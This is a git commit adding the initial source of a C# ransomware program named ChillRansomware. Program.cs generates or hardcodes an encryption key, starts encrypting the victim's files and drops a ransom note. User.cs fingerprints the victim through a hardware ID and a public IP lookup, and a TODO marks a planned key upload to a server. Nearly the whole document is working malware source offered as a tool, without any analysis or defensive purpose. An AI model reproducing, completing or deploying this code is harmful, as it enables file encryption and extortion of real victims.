0badd9350e4f4ae25a389eec83b4f4842c054e50
PaulIRL <84643540+PaulIRL@users.noreply.github.com>
2021-09-09 09:36:06 -0700

    Initial release, no upload yet

---
+++ Program.cs
@@ -0,0 +1,67 @@
+﻿using Newtonsoft.Json;
+using Newtonsoft.Json.Linq;
+using System;
+using System.Buffers.Text;
+using System.IO;
+using System.Threading;
+
+namespace ChillRansomware
+{
+    class Program
+    {
+        public static User user = new User();
+        //TODO: Change wallpaper on every OS
+        static void Main(string[] args)
+        {
+            //Handle if user has or hasnt internet
+            HandleInternet();
+
+            if (Settings.DebugMode)
+                File.WriteAllText("info.json", JsonConvert.SerializeObject(user));
+
+
+            //TODO: Add upload to server here
+            Encryption.StartEncryption(user.ransomInfo.EncryptionKey, user.ransomInfo.Salt);
+
+            CreateMessage();
+        }
+
+        private static void HandleInternet()
+        {
+            bool HasInternet = Utils.CheckForInternetConnection();
+            if (Settings.UseLocalKeyIfNoInternet)
+            {
+                if (HasInternet)
+                {
+                    user.ransomInfo.EncryptionKey = Utils.RandomString(Settings.KeyLength);
+                    user.ransomInfo.Salt = Utils.RandomSaltBytes();
+                    File.AppendAllText("AAAA.txt", user.ransomInfo.EncryptionKey);
+                }
+                else
+                {
+                    user.ransomInfo.EncryptionKey = Settings.HardCodedKey;
+                    user.ransomInfo.Salt = Settings.HardCodedSaltBytes;
+                }
+            }
+            else
+            {
+                user.ransomInfo.EncryptionKey = Utils.RandomString(Settings.KeyLength);
+                user.ransomInfo.Salt = Utils.RandomSaltBytes();
+                do
+                {
+                    HasInternet = Utils.CheckForInternetConnection();
+                    if (HasInternet == false)
+                        Thread.Sleep(5000);
+                } while (HasInternet == false);
+            }
+        }
+
+        static void CreateMessage()
+        {
+            if (!File.Exists(Settings.MessagePath))
+            {
+                File.WriteAllLines(Settings.MessagePath, Settings.MessageText);
+            }
+        }
+    }
+}
---
+++ User.cs
@@ -0,0 +1,46 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Security.Cryptography;
+using System.Net;
+using Newtonsoft.Json;
+
+namespace ChillRansomware
+{
+    class User
+    {
+        public string UUID;
+        public string IP;
+        public RansomInfo ransomInfo = new RansomInfo();
+
+        static string GetIP()
+        {
+            try
+            {
+                string IpInfo = new WebClient().DownloadString("http://ip-api.com/json/");
+                return JsonConvert.DeserializeObject<dynamic>(IpInfo)["query"];
+            }
+            catch { return "Unknown"; }
+        }
+
+        public User()
+        {
+            try
+            {
+                UUID = libc.hwid.HwId.Generate();
+            }
+            catch
+            {
+                UUID = "This is probably a VM";
+                //TODO: Implement something based on neofetch + some .NET apis....
+                //or to edit the library used to get UUIDs
+            }
+            IP = GetIP();
+        }
+    }
+
+
+
+}
